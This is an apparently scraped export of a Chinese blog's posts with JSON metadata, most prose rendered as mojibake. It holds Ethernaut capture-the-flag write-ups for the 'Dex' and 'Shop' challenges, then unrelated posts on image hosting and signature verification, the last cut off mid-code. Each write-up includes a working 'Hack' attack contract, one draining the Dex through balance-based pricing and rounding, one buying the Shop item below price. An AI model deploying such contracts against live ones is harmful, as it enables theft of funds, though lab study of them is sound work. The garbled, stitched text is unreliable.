å¦‚æœæ‚¨è®¾æ³•ä»åˆçº¦ä¸­å–å‡ºä¸¤ä¸ªä»£å¸ä¸­çš„è‡³å°‘ä¸€ä¸ªï¼Œå¹¶è®©åˆçº¦å¾—åˆ°ä¸€ä¸ªçš„â€œåâ€çš„tokenä»·æ ¼ï¼Œæ‚¨å°†åœ¨æ­¤çº§åˆ«ä¸Šå–å¾—æˆåŠŸã€‚ æ³¨æ„ï¼š é€šå¸¸ï¼Œå½“æ‚¨ä½¿ç”¨ERC20ä»£å¸è¿›è¡Œäº¤æ¢æ—¶ï¼Œæ‚¨å¿…é¡»approveåˆçº¦æ‰èƒ½ä¸ºæ‚¨ä½¿ç”¨ä»£å¸ã€‚ä¸ºäº†ä¸é¢˜ç›®çš„è¯­æ³•ä¿æŒä¸€è‡´ï¼Œæˆ‘ä»¬åˆšåˆšå‘åˆçº¦æœ¬èº«æ·»åŠ äº†approveæ–¹æ³•ã€‚å› æ­¤ï¼Œè¯·éšæ„ä½¿ç”¨ contract.approve(contract.address, ) è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ä»£å¸ï¼Œå®ƒä¼šè‡ªåŠ¨æ‰¹å‡†å°†ä¸¤ä¸ªä»£å¸èŠ±è´¹æ‰€éœ€çš„é‡‘é¢ã€‚ è¯·å¿½ç•¥SwappableTokenåˆçº¦ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š ä»£å¸çš„ä»·æ ¼æ˜¯å¦‚ä½•è®¡ç®—çš„ï¼Ÿ approveæ–¹æ³•å¦‚ä½•å·¥ä½œï¼Ÿ æ‚¨å¦‚ä½•æ‰¹å‡†ERC20 çš„äº¤æ˜“ï¼Ÿ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract Dex is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function addLiquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableToken is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 123456789101112131415161718- ## 2. åˆ†æ#### tipsï¼š [å‚è€ƒåšå®¢](https://stermi.xyz/blog/ethernaut-challenge-21-solution-dex)- 2.1 åˆ†æä»£ç å¯çŸ¥ï¼šè¿™æ˜¯ä¸€ä¸ªç®€å•çš„`ERC20`ä»¤ç‰Œï¼Œå®ƒå‘é“¸é€ ä¸€ä¸ª`initialSupply`ï¼ˆæŒ‡å®šä¸º çš„è¾“å…¥ï¼‰å¹¶è¦†ç›–äº†å‡½æ•°ä»¥é˜²æ­¢åœ°å€èƒ½å¤Ÿæ‰¹å‡†ä»»ä½•ä»¤ç‰Œã€‚- 2.2 åˆ†æ Dex.sol åˆçº¦å¯çŸ¥ï¼Œå®ƒå…è®¸`owner`Dex æä¾›ä¸€å¯¹ä»£å¸çš„æµåŠ¨æ€§`token1`ï¼Œå¹¶ä¸”`token2`åœ¨æœ€ç»ˆç”¨æˆ·äº¤æ¢è¿™äº›ä»£å¸æ—¶ä¸æ”¶å–ä»»ä½•è´¹ç”¨ã€‚æœ€ç»ˆç”¨æˆ·å°†ä½¿ç”¨ Dex æ¥`swap`ï¼ˆå‡ºå”®ï¼‰ç‰¹å®šæ•°é‡çš„ä¸€ç§ä»£å¸ï¼Œä»¥å–å›`swapAmount`ï¼ˆå–å†³äº Dex çš„ä»£å¸ä»·æ ¼ï¼‰å¦ä¸€ç§ä»£å¸ã€‚- #### `function setTokens(address _token1, address _token2) public onlyOwner` ```solidity function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; è¯¥åŠŸèƒ½å…è®¸Dexå¹³å°çš„æ‰€æœ‰è€…è®¾ç½®`token1`å’Œçš„åœ°å€`token2`ã€‚è¯¥å‡½æ•°æ­£ç¡®æ£€æŸ¥åªæœ‰`owner`Dex çš„ æ‰èƒ½è°ƒç”¨æ­¤å‡½æ•°ã€‚`owner`å½“å·²ç»æä¾›è¿™äº›ä»£å¸çš„ä¾›åº”æ—¶ï¼Œé˜²æ­¢æ›´æ”¹è¿™äº›åœ°å€ä¹Ÿæ˜¯æœ‰æ„ä¹‰çš„ï¼ˆå¦åˆ™æ—§ä»£å¸å°†æ°¸è¿œå¡åœ¨åˆçº¦ä¸­ï¼‰ã€‚ #### `function approve(address spender, uint256 amount) public` 1234function approve(address spender, uint256 amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount);&#125; è¿™æ˜¯ä¸€ä¸ªæ›´å®ç”¨çš„åŠŸèƒ½ï¼Œå…è®¸æœ€ç»ˆç”¨æˆ·æ‰¹å‡†`spender`ç®¡ç†`amount`ä¸¤ä¸ªä»¤ç‰Œä¸­çš„ä¸€ä¸ªã€‚è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¥‡æ€ªçš„ã€‚æ‚¨å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨ä¼ é€’ç›¸åŒå‚æ•°çš„`token1`å’Œå‡½æ•°æ¥å®ç°ç›¸åŒçš„ç»“æœï¼Œæ­£å¦‚æˆ‘æ‰€è¯´çš„ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå®ç”¨å‡½æ•°ï¼Œå¯ä»¥è®©æœ€ç»ˆç”¨æˆ·çš„ç”Ÿæ´»æ›´è½»æ¾ã€‚`token2` `approve` ### `function balanceOf(address token, address account) public view returns (uint256)` 123function balanceOf(address token, address account) public view returns (uint256) &#123; return IERC20(token).balanceOf(account);&#125; è·å–ç‰¹å®šä»£å¸åœ°å€çš„ç”¨æˆ·ä½™é¢çš„ç®€å•å®ç”¨å‡½æ•°ã€‚ ### `function swap(address from, address to, uint256 amount) public` 123456789101112function swap( address from, address to, uint256 amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; è¿™æ˜¯è´Ÿè´£å°†ä¸€ä¸ªä»£å¸ä¸å¦ä¸€ä¸ªä»£å¸äº¤æ¢ï¼ˆå‡ºå”®/è´­ä¹°ï¼‰çš„åŠŸèƒ½ã€‚æ‚¨çœ‹åˆ°çš„ç¬¬ä¸€ä¸ª`require`ï¼Œæ£€æŸ¥æ‚¨æ˜¯å¦åªèƒ½äº¤æ¢`token1`ï¼Œ`token2`åä¹‹äº¦ç„¶ã€‚ ä¹‹åï¼ŒDex è®¡ç®—æ‰æœŸä»·æ ¼ã€‚å¯¹äºç»™å®šamountçš„ä¸€ä¸ªä»¤ç‰Œï¼Œç”¨æˆ·å–å›äº†å¤šå°‘å…¶ä»–ä»¤ç‰Œï¼Ÿ ç„¶åå®ƒæ‰§è¡Œæ‰€æœ‰éœ€è¦çš„ä¼ è¾“ amountå°†å‡ºå”®çš„ä»£å¸ä»ç”¨æˆ·è½¬ç§»åˆ° Dex åˆçº¦ æ‰¹å‡†Dexç®¡ç†swapAmountç”¨æˆ·è´­ä¹°çš„ä»£å¸ swapAmountä» Dex å‘ç”¨æˆ·è½¬ç§»é‡‘é¢ å½“ä¸”ä»…å½“ä¸¤è€…token1éƒ½æ˜¯ä»£å¸æ ‡å‡†token2çš„è‰¯å¥½å®æ–½æ—¶ï¼Œæ‰ä¸éœ€è¦å¯¹è¿™äº›é‡‘é¢è¿›è¡Œæ£€æŸ¥ERC20ã€‚å½“å‰çš„ Dex æ­£åœ¨ä½¿ç”¨ OpenZeppelin ERC20 å®ç°çš„ä¸¤ç§ä»£å¸ï¼Œå› æ­¤å¦‚æœ Dex æˆ–ç”¨æˆ·çš„ä½™é¢ä¸­æ²¡æœ‰è¶³å¤Ÿæ•°é‡çš„ä»£å¸æ¥æ‰§è¡Œè½¬è´¦ï¼Œäº¤æ˜“å°†è‡ªåŠ¨æ¢å¤ function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)è¿™æ˜¯æ•´ä¸ªåˆçº¦ä¸­æœ€æ ¸å¿ƒä¹Ÿæ˜¯æœ€é‡è¦çš„åŠŸèƒ½ã€‚æ­¤åŠŸèƒ½è´Ÿè´£è®¡ç®—æ‰æœŸä»·æ ¼ã€‚æ‰§è¡Œ çš„tokenXäº¤æ¢æ“ä½œæ—¶ï¼Œç”¨æˆ·è·å¾—å¤šå°‘ä»¤ç‰Œï¼ŸtokenY Dex å†…éƒ¨çš„å½“å‰å®ç°æ˜¯ä½¿ç”¨ä»£å¸ä½™é¢æ¥è®¡ç®—ä»·æ ¼ï¼Œå¹¶å› æ­¤è®¡ç®—ç”¨æˆ·å°†æ”¶åˆ°çš„ä»£å¸æ•°é‡ã€‚ ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªé—®é¢˜ï¼Ÿä½¿ç”¨ä½™é¢ä½œä¸ºè®¡ç®—ä»·æ ¼çš„ä¸€ä¸ªå› ç´ å°†ä½¿æ‚¨çš„åˆçº¦çƒ­è¡·äºç§°ä¸ºâ€œä»·æ ¼æ“çºµâ€çš„æ”»å‡»ï¼Œä¸å¹¸çš„æ˜¯ï¼ˆä½†ä¸ä»…ä¸è¿™ä¸ªç®€å•çš„ä½™é¢æ¡ˆä¾‹æœ‰å…³ï¼‰å®ƒå¹¶ä¸å°‘è§ã€‚ ç”¨äºè®¡ç®—ç”¨æˆ·å› äº¤æ¢æ“ä½œè€Œæ”¶åˆ°çš„ä»£å¸æ•°é‡çš„å…¬å¼å¦‚ä¸‹((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))) è¿™ä¸ªå…¬å¼å‘Šè¯‰ä½ å½“ä½ å‘é€ä»£å¸toæ—¶ä½ ä¼šå¾—åˆ°å¤šå°‘ä»£å¸ã€‚è¾ƒä½çš„æ˜¯ï¼ˆä¸ çš„ä½™é¢ç›¸æ¯”ï¼‰çš„ä½™é¢ï¼Œè¾ƒé«˜çš„æ˜¯ çš„é‡‘é¢ã€‚amount``from``from``to``to è¯¥ Dex ä¸ä½¿ç”¨å¤–éƒ¨Oracleï¼ˆå¦‚Chainlinkï¼‰æˆ–Uniswap TWAPï¼ˆæ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼‰æ¥è®¡ç®—æ‰æœŸä»·æ ¼ã€‚ç›¸åï¼Œå®ƒä½¿ç”¨ä»¤ç‰Œçš„ä½™é¢æ¥è®¡ç®—å®ƒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒã€‚ åœ¨ Solidity ä¸­ï¼Œæœ‰ä¸€ä¸ªç§°ä¸ºâ€œèˆå…¥è¯¯å·®â€çš„å·²çŸ¥é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±æ‰€æœ‰æ•´æ•°é™¤æ³•å‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°è¿™ä¸€äº‹å®å¼•èµ·çš„ã€‚è¿™æ„å‘³ç€å¦‚æœä½ æ‰§è¡Œ5/2ç»“æœå°†ä¸æ˜¯2.5but 2ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬å–æ‰ 1ï¼Œtoken1ä½†token2*amount &lt; token1æˆ‘ä»¬ä¼šæ‹¿å›0 token2ï¼åŸºæœ¬ä¸Šæˆ‘ä»¬ä¼šå‡ºå”®ä»£å¸ä»¥è·å¾—é›¶å›æŠ¥ï¼ 2.3 å‚è€ƒè§†é¢‘ ç¼–å†™æ”»å‡»åˆçº¦ contract Hack &#123; IDex private immutable dex; IERC20 private immutable token1; IERC20 private immutable token2; constructor (IDex _dex) &#123; dex = _dex; token1 = IERC20(dex.token1); token2 = IERC20(dex.token2); &#125; function pwn() external &#123; token1.transferFrom(msg.sender, address(this), 10); token2.transferFrom(msg.sender, address(this), 10); token1.approve(address(dex), type(uint).max); token2.approve(address(dex), type(uint).max); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); dex.swap(address(token2), address(token1), 45); require(token1.balanceOf(address(dex)) == 0, &quot;dex.balance != 0&quot;); &#125; function _swap(IERC20 tokenIn, IERC20 tokenOut) private &#123; dex.swap( address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this))) &#125; &#125; 3. è§£é¢˜ï¼ˆèµ„é‡‘ä¸è¶³ï¼‰","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Shop","slug":"Smart contracts/ethernaut/Shop","date":"2023-03-08T04:47:10.000Z","updated":"2023-03-08T04:47:10.000Z","comments":true,"path":"2023/03/08/Smart contracts/ethernaut/Shop/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/08/Smart%20contracts/ethernaut/Shop/","excerpt":"","text":"Shop1. é¢˜ç›®è¦æ±‚ 1.1 æ‚¨èƒ½åœ¨å•†åº—ä»¥ä½äºè¦æ±‚çš„ä»·æ ¼è´­ä¹°åˆ°å•†å“å—ï¼Ÿ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š shopåˆçº¦é¢„è®¡ç”±ä¹°å®¶ä½¿ç”¨ äº†è§£viewå‡½æ•°çš„é™åˆ¶ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Buyer &#123; function price() external view returns (uint); &#125; contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price(); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829## 2. åˆ†æ#### tipsï¼š[å‚è€ƒåšå®¢](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)- 2.1 è§‚å¯Ÿä»£ç å¯çŸ¥ ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª`price`å†…éƒ¨åˆåŒï¼Œä»£è¡¨è´­ä¹°è¯¥ç‰©å“å¿…é¡»æ”¯ä»˜`wei`çš„é‡‘é¢ã€‚`Buyer` **ä¹Ÿå¯ä»¥ä»…åœ¨å°šæœªå”®å‡ºçš„**æƒ…å†µä¸‹è´­ä¹°è¯¥å•†å“ã€‚è¯¥å±æ€§ç”±å‡½æ•°ä¸­`isSold`åˆå§‹åŒ–ä¸º`false`ç„¶åæ›´æ”¹ä¸ºçš„çŠ¶æ€å˜é‡å¤„ç†ã€‚- 2.2 è¯¦ç»†æŸ¥çœ‹ buy() å‡½æ•°ï¼Œ- è¿™æ˜¯åˆçº¦çš„ä¸»è¦åŠŸèƒ½ã€‚å®ƒæŠ•å°„åˆ°`msg.sender`å¹¶`Buyer`é€šè¿‡è¿™æ ·åšå®ƒæœŸæœ›äº¤æ˜“çš„å‘é€è€…æ˜¯ä¸€ä¸ªå®ç°æ¥å£ä¸­å®šä¹‰çš„åŠŸèƒ½çš„**åˆçº¦**ã€‚`` å³ä½¿åœ¨æŒ‘æˆ˜æè¿°ä¸­æ²¡æœ‰æ˜ç¡®è¯´æ˜ï¼Œä¹Ÿåº”è¯¥è¿”å›**ä¹°å®¶**æ„¿æ„ä¸ºè´­ä¹°å•†åº—å•†å“æ”¯ä»˜çš„`function price() external view returns (uint256);`ä»·æ ¼ã€‚ åˆåŒæ£€æŸ¥ä¹°æ–¹çš„ä»·æ ¼ï¼ˆä¹°æ–¹æ„¿æ„æ”¯ä»˜çš„ä»·æ ¼ï¼‰æ˜¯å¦å¤§äºå•†åº—çš„ä»·æ ¼ï¼Œå¹¶æ£€æŸ¥è¯¥å•†å“æ˜¯å¦å°šæœªå”®å‡ºã€‚å¦‚æœè¿™ä¸ªè¦æ±‚é€šè¿‡ï¼Œå®ƒä¼šæ›´æ–°`isSold`åˆ°`true`å¹¶å°†`price`çš„å€¼æ›´æ–°ä¸º`_buyer.price();`ç†è®ºä¸Š**åº”è¯¥**ä¸ä¹‹å‰ä¸€æ¡æŒ‡ä»¤è¿”å›çš„å€¼ç›¸åŒã€‚- 2.3 è¿™é‡Œçš„å…³é”®æ¦‚å¿µæ˜¯ï¼šä½ **æ°¸è¿œä¸åº”è¯¥** **ç›²ç›®åœ°ç›¸ä¿¡**ä½ æœŸæœ›**å¤–éƒ¨å‚ä¸è€…**ä¼šåšä»€ä¹ˆï¼Œå³ä½¿ä½ å®šä¹‰äº†ä¸€ä¸ªå…·æœ‰å¤–éƒ¨å‚ä¸è€…åº”è¯¥ä¿¡ä»»çš„é€»è¾‘çš„ç‰¹å®šæ¥å£ã€‚ **æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡ä¸åœ¨ä½ æ§åˆ¶ä¹‹ä¸‹çš„äº‹æƒ…ã€‚** å› ä¸º**æˆ‘ä»¬**æ˜¯ä¹°å®¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç®€å•çš„å®ç°`price`è¿™æ ·çš„åŠŸèƒ½ ```solidity function price() external view returns (uint256) &#123; return victim.isSold() ? 1 : 1000; &#125; å› ä¸º`price`æ˜¯ä¸€ä¸ª`view`å‡½æ•°ï¼Œæˆ‘ä»¬ä¸èƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çŠ¶æ€å˜é‡æ¥æ”¹å˜`uint256`å‡½æ•°è¿”å›çš„å€¼ï¼Œä½†æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ ‡è®°ä¸º`view`æˆ– çš„å¤–éƒ¨è°ƒç”¨å‡½æ•°`pure`ã€‚ 2.4 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ 1234567891011121314151617181920contract Hack &#123; Shop private immutable target; constructor (address _target) &#123; target = Shop(_target); &#125; function pwn() external &#123; target.buy(); require(target.price() == 99, &quot;price != 99&quot;); &#125; function price() external view returns (uint) &#123; if (target.isSold()) &#123; return 99; &#125; return 100; &#125;&#125; 3. è§£é¢˜ï¼ˆæš‚æ—¶æ²¡æœ‰ä»¥å¤ªäº†ï¼Œåˆ°æ—¶å€™æœ‰é’±äº†å†æ¥åšï¼Œç”Ÿæˆå®ä¾‹å°±éœ€è¦ 0.3etherï¼‰","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"é¶åœºæ€»ç»“","slug":"Smart contracts/ethernaut/æ€»ç»“","date":"2023-02-23T04:10:10.000Z","updated":"2023-02-23T04:10:10.000Z","comments":true,"path":"2023/02/23/Smart contracts/ethernaut/æ€»ç»“/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/23/Smart%20contracts/ethernaut/%E6%80%BB%E7%BB%93/","excerpt":"","text":"æ€»ç»“é¢˜ç›®å¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æŒºéš¾çš„ï¼Œå¾ˆå¤šé¢˜éƒ½æ˜¯åšå‡ºæ¥ä½†æ˜¯è¿˜æ²¡æœ‰å½»åº•ç†è§£å’Œç†Ÿç»ƒè¿ç”¨ï¼Œä»¥åè¿˜å¾—å¤šèŠ±ç‚¹æ—¶é—´æ¥æ¶ˆåŒ–å’Œå¸æ”¶ åšé¢˜çš„å‚è€ƒæœ‰å¦‚ä¸‹ï¼š åšå®¢1 åšå®¢2 åšå®¢3 åšé¢˜è§†é¢‘ ç›®å‰è¿›åº¦ 20 ï¼ŒèŠ±è´¹ether å¤§çº¦ 2ä»¥å¤ª","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://biyouqiuqiu.com/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"hexo å›¾åºŠæ­å»ºçš„ç—›è‹¦å†ç¨‹","slug":"Hexo/hexo å›¾åºŠæ­å»ºçš„ç—›è‹¦å†ç¨‹","date":"2023-02-02T16:00:00.000Z","updated":"2023-02-02T16:00:00.000Z","comments":true,"path":"2023/02/03/Hexo/hexo å›¾åºŠæ­å»ºçš„ç—›è‹¦å†ç¨‹/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/03/Hexo/hexo%20%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA%E7%9A%84%E7%97%9B%E8%8B%A6%E5%8E%86%E7%A8%8B/","excerpt":"","text":"å®Œå–„åšå®¢å›¾åºŠä¸Šä¼ çš„é—®é¢˜ç—›è‹¦ï¼šæœ¬åœ°å›¾ç‰‡å†™å…¥åšå®¢æ–‡æ¡£ä¸­ï¼Œåœ¨æœ¬åœ°å¯ä»¥çœ‹è§ï¼Œä½†æ˜¯ä¸€æ—¦ä¸Šä¼ åˆ°hexoåšå®¢ä¸Šï¼Œå›¾ç‰‡éƒ½æ˜¯æ— æ³•æ˜¾ç¤ºçš„ï¼Œéƒ½åªèƒ½é€šè¿‡åœ¨çº¿ç½‘ç«™ï¼Œå°†å›¾ç‰‡è½¬æ¢æˆé“¾æ¥çš„å½¢å¼ï¼Œè¿™æ ·çœŸçš„å¾ˆéº»çƒ¦ã€‚æ‰€ä»¥å°±å†³å®šä½¿ç”¨å›¾åºŠçš„æ–¹æ³•æ¥è¿›è¡Œè‡ªåŠ¨è½¬æ¢ã€‚ä¸€ã€ä½¿ç”¨GitHubä½œä¸ºå­˜å‚¨ä½ç½®tips: æˆ‘å‘ç°ï¼Œç”¨GitHubæ’å…¥å›¾ç‰‡å†™åšå®¢çš„è¯ï¼Œéœ€è¦ç§‘å­¦ä¸Šç½‘æ‰è¡Œï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œä¸èƒ½ç§‘å­¦ä¸Šç½‘å°±ä½¿ç”¨å…¶ä»–å›¾åºŠå°±ğŸ†—å•¦1.1 é¦–å…ˆå¾—æœ‰GitHubçš„è´¦å·ï¼Œåœ¨GitHubä¸Šé¢æ–°å»ºä¸€ä¸ªä¸“é—¨å­˜å‚¨å›¾ç‰‡çš„ä»“å‚¨ï¼Œå¹¶è·å–å®ƒçš„ä»¤ç‰Œï¼Œè¿›å»çš„æ–¹å¼ï¼šç‚¹å‡» å¤´åƒ &#x3D;&#x3D;&gt; setting &#x3D;&#x3D;&gt; Develper settings 1.2 newä¸€ä¸ªtoken 1.3 å›åˆ° PicGo ä¸Šï¼Œ åˆ†æ”¯éƒ¨åˆ†ç°åœ¨éƒ½æ˜¯main åˆ†æ”¯ï¼Œçº¢è‰²éƒ¨åˆ†éƒ½ä¸º[ç”¨æˆ·å]&#x2F;[ä»“åº“å]ï¼Œè‡ªå®šä¹‰åŸŸåå“ªé‡Œçš„æœ«å°¾åŠ ä¸Š@main ï¼Œä¸ºäº†æ–¹ä¾¿å¤åˆ¶ï¼Œhttps://cdn.jsdelivr.net/gh/[ç”¨æˆ·å]/[ä»“åº“å]@main å°†ä¸Šé¢ç”Ÿæˆçš„tokenç²˜è´´åˆ°æŒ‡å®šä½ç½®å°±okäº†ï¼Œæœ€åè¦ç‚¹å‡» â€œè®¾ä¸ºé»˜è®¤å›¾åºŠâ€ï¼Œå¦åˆ™ä»–ä¸ä¼šå’Œæ‰§è¡Œè¿™ä¸ªå›¾åºŠçš„ï¼Œï¼ˆè¸©å‘äº¿ä¸ªå°æ—¶ï¼‰1https://cdn.jsdelivr.net/gh/[ç”¨æˆ·å]/[ä»“åº“å]@main äºŒã€ä½¿ç”¨SM.MSä½œä¸ºå­˜å‚¨ä½ç½®2.1 SM.MSä¼ é€é—¨ ï¼Œåœ¨ç½‘ç«™ä¸Šæ³¨å†Œä¸€ä¸ªè´¦å· 2.2 åˆ›å»ºä»¤ç‰Œ 2.3 åœ¨PicGoä¸Šé…ç½®SM.MSå›¾åºŠï¼Œåœ¨å¤‡ç”¨ä¸Šä¼ åŸŸåå¡« smms.appï¼ˆæˆ‘çš„PicGoçš„ç‰ˆæœ¬ä¸º2.3.1ï¼‰ï¼Œå°†ä¸Šé¢ç”Ÿæˆçš„tokenç²˜è´´åˆ°æŒ‡å®šä½ç½®å°±okäº†ï¼Œæœ€åè¦ç‚¹å‡» â€œè®¾ä¸ºé»˜è®¤å›¾åºŠâ€ï¼Œå¦åˆ™ä»–ä¸ä¼šå’Œæ‰§è¡Œè¿™ä¸ªå›¾åºŠçš„ï¼Œï¼ˆè¸©å‘äº¿ä¸ªå°æ—¶ï¼‰ ä¸‰ã€ä½¿ç”¨vikaç»´æ ¼è¡¨å­˜å‚¨3.1 åœ¨vikaå®˜ç½‘ ä¸Šæ³¨å†Œä¸€ä¸ªè´¦å· 3.2 æ–°å»ºè‡ªå·±çš„å¤šç»´ç©ºç™½è¡¨æ ¼ï¼Œå¹¶è·å–å…¶id 3.3 è·å–ä»¤ç‰Œï¼šç‚¹å‡»å·¦ä¸‹è§’çš„å¤´åƒ &#x3D;&#x3D;&gt;ä¸ªäººè®¾ç½® 3.4 åœ¨PicGoä¸Šå¡«å…¥ç›¸å…³çš„ ID å’Œ token tips: ä»¤ç‰Œtokenåªéœ€è¦ä¸€ä¸ªå°±è¡Œäº†ï¼Œvikaä¸­å¯ä»¥å»ºå¤šå¼ è¡¨ï¼Œå¦‚æœéœ€è¦æ›´æ¢å‚¨å­˜ä½ç½®åªéœ€è¦åœ¨PicGoä¸­æ›´æ¢ç»´æ ¼è¡¨IDå°±è¡Œäº†æœ€ä¸æµçš„æ–¹æ³•å°±æ˜¯ï¼Œä½¿ç”¨ç½‘ç«™ä¸Šä¼ ï¼Œè½¬æ¢ç½‘ç«™1https://moe.photo/","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"å›¾åºŠ","slug":"å›¾åºŠ","permalink":"https://biyouqiuqiu.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"sm.ms","slug":"sm-ms","permalink":"https://biyouqiuqiu.com/tags/sm-ms/"},{"name":"vika","slug":"vika","permalink":"https://biyouqiuqiu.com/tags/vika/"}]},{"title":"äº†è§£ç­¾åè®¤è¯","slug":"Solidity/Basic_Knowledge/äº†è§£ç­¾åè®¤è¯","date":"2023-01-22T08:47:10.000Z","updated":"2023-01-22T08:47:10.000Z","comments":true,"path":"2023/01/22/Solidity/Basic_Knowledge/äº†è§£ç­¾åè®¤è¯/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/22/Solidity/Basic_Knowledge/%E4%BA%86%E8%A7%A3%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81/","excerpt":"","text":"éªŒè¯ç­¾å1. ç­¾åä»£ç ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// SPDX-License-Identifier: MITpragma solidity ^0.8.4; /* 1. message to sign 2. hash(message) 3. sign(hash(message), private key) | offchain 4. ecrecover(hash(message), signature) == signer */contract VerifySig &#123; // 